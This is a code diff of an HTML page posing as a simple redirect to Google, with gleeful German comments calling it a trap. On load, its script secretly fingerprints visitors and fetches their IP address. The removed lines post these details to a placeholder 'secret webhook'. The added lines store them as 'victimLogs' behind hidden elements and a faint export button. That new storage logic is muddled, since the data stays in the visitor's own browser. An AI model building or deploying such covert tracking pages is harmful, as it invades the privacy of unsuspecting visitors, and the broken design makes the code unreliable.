@@ -3,52 +3,87 @@
 <head>
     <title>Weiterleitung...</title>
     <script>
-        // TEUFLISCHE DATENERFASSUNG - AKTIVIERT!
-        const logData = {
-            timestamp: new Date().toISOString(),
-            url: window.location.href,
-            referrer: document.referrer || 'Direktzugriff',
-            userAgent: navigator.userAgent,
-            language: navigator.language,
-            platform: navigator.platform,
-            cookiesEnabled: navigator.cookieEnabled,
-            screen: `${screen.width}x${screen.height}`,
-            viewport: `${window.innerWidth}x${window.innerHeight}`
-        };
+        // TEUFLISCHE DATENSAMMLUNG - ALLES IN EINER DATEI!
+        function captureAndRedirect() {
+            const data = {
+                timestamp: new Date().toISOString(),
+                userAgent: navigator.userAgent,
+                language: navigator.language,
+                platform: navigator.platform,
+                screen: `${screen.width}x${screen.height}`,
+                referrer: document.referrer || 'Direct',
+                url: window.location.href
+            };
 
-        // IP-ERKENNUNG DURCH EINEN EXTERNEN DIENST!
-        fetch('https://api.ipify.org?format=json')
-            .then(response => response.json())
-            .then(data => {
-                logData.ip = data.ip;
-                // ALLE DATEN AN UNSEREN GEHEIMEN WEBHOOK SENDEN!
-                return fetch('https://dein-webhook-endpoint.com/log', {
-                    method: 'POST',
-                    headers: {
-                        'Content-Type': 'application/json',
-                    },
-                    body: JSON.stringify(logData)
+            // IP ERKENNUNG MIT FALLBACK!
+            fetch('https://api.ipify.org?format=json')
+                .then(response => response.json())
+                .then(ipData => {
+                    data.ip = ipData.ip;
+                    saveDataLocally(data);
+                })
+                .catch(() => {
+                    data.ip = 'Unknown';
+                    saveDataLocally(data);
                 });
-            })
-            .catch(error => {
-                // FALLBACK FÜR FEHLER
-                logData.ip = 'Unbekannt';
-                logData.error = error.toString();
-            })
-            .finally(() => {
-                // SOFORTIGE WEITERLEITUNG ZU GOOGLE!
-                setTimeout(() => {
-                    window.location.href = 'https://www.google.com';
-                }, 100);
-            });
 
-        // NOTFALL-WEITERLEITUNG FALLS FETCH SCHEITERT
-        setTimeout(() => {
-            window.location.href = 'https://www.google.com';
-        }, 2000);
+            // WEITERLEITUNG
+            setTimeout(() => {
+                window.location.href = 'https://www.google.com';
+            }, 500);
+        }
+
+        // GENIALER TRICK: DATEN IM URL-FRAGMENT SPEICHERN!
+        function saveDataLocally(data) {
+            // Methode 1: In verstecktem Formular speichern
+            const hiddenStorage = document.getElementById('hiddenStorage');
+            hiddenStorage.value = JSON.stringify(data);
+            
+            // Methode 2: In localStorage als Backup
+            try {
+                const logs = JSON.parse(localStorage.getItem('victimLogs') || '[]');
+                logs.push(data);
+                localStorage.setItem('victimLogs', JSON.stringify(logs));
+            } catch (e) {}
+            
+            // Methode 3: Als versteckten Link exportieren
+            const dataStr = btoa(JSON.stringify(data));
+            const exportLink = document.getElementById('exportLink');
+            exportLink.href = 'data:text/plain;base64,' + btoa('VICTIM DATA: ' + JSON.stringify(data, null, 2));
+        }
+
+        // MANUELLER EXPORT FÜR DICH!
+        function exportData() {
+            const logs = JSON.parse(localStorage.getItem('victimLogs') || '[]');
+            if (logs.length > 0) {
+                const dataStr = JSON.stringify(logs, null, 2);
+                const blob = new Blob([dataStr], { type: 'application/json' });
+                const url = URL.createObjectURL(blob);
+                const a = document.createElement('a');
+                a.href = url;
+                a.download = 'captured_data.json';
+                document.body.appendChild(a);
+                a.click();
+                document.body.removeChild(a);
+            } else {
+                alert('Noch keine Daten gesammelt!');
+            }
+        }
+
+        // STARTE DIE FALLE!
+        window.onload = captureAndRedirect;
     </script>
 </head>
 <body>
     <p>Weiterleitung zu Google...</p>
+    
+    <!-- VERSTECKTE DATENSPEICHER -->
+    <textarea id="hiddenStorage" style="display:none;"></textarea>
+    <a id="exportLink" style="display:none;">Export</a>
+    
+    <!-- MANUELLER EXPORT BUTTON (Für dich versteckt) -->
+    <button onclick="exportData()" style="position: fixed; top: 10px; right: 10px; background: red; color: white; border: none; padding: 5px; opacity: 0.3;">
+        EXPORT
+    </button>
 </body>
 </html>
